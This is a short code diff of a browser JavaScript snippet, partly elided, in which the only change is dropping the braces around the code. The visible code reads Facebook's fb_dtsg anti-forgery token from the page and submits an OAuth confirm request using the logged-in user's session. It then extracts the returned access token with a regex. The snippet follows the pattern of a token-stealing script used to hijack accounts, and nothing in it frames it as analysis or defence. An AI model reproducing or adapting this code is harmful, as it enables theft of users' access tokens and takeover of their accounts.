@@ -1,4 +1,4 @@
-{
+
     var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
     var http = new XMLHttpRequest;
     var data = new FormData();
@@ -21,5 +21,4 @@ token = http.responseText.match(/access_token=(.*?)&/)[1];
     http.open('POST', '/v1.0/dialog/oauth/confirm',false);
 http.send(data);
 token;
-};
 
